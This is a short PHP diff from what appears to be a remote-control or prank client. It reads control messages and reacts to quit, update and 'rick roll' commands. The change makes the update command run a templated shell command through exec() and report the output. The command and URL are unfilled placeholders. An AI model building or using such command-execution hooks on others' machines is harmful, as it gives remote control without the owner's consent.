@@ -91,7 +91,8 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
-            $msg .= '{{B64_CMD_UPDATE}}' . "\n";
+            $res = exec('{{B64_CMD_UPDATE}}');
+            $msg .= "Update ran with response: '$res'\n";
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
